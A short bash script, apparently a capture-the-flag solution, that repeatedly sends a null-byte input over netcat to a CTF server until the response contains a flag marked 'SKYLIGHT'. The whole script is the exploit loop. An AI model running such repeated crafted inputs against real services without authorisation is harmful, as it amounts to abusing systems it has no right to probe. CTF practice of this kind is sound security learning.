#!/bin/bash

while true; do
python2 -c "print '\x00' * 40 + '\n' + '\x00' * 40" | nc uptoyou.ctf.secso.cc 5004
done | grep SKYLIGHT
